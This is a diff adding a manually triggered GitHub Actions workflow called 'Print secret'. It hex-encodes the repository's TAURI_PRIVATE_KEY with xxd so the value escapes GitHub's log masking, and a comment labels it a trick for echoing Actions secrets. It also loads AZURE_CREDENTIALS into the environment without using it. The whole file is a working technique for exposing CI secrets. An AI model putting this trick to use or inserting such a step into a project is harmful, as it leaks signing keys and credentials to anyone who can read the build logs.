@@ -1,0 +1,16 @@
+name: Print secret
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build-deploy:
+    name: Print secret
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print secret
+        env:
+          AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
+        run: |
+          echo "Trick to echo GitHub Actions Secret:  "
+          echo "${{secrets.TAURI_PRIVATE_KEY}}" | xxd -ps
